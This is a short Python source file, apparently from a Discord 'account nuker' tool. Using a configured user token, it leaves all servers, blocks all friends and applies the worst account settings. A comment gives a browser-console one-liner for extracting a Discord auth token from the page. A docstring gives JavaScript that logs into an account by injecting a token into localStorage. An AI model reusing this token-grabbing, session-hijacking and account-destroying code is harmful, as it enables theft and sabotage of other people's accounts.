from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, SetWorstSettings
from AresCore import CheckToken, IsGuild, GetAllGuilds
from Utils import clear
from rich import print as rprint
import global_vars, os


config = global_vars.config
token = config['account']['token']

def user_check() -> None:
	clear()

	rprint('[purple] > Checking Token User [white]')
	if CheckToken(token, 'user'):
		rprint('[chartreuse3] > Token user is vaild [white]')
	else:
		rprint('[red3] > Token user is invaild [white]')
		os._exit(0)


def AccountNuke() -> None:
	SetWorstSettings()
	LeaveGuilds()
	BlockFriends()
	# CreateGuilds()

# get token: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
"""
let token = "your token";

function login(token) {
    setInterval(() => {
      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
      location.reload();
    }, 2500);
  }

login(token);
"""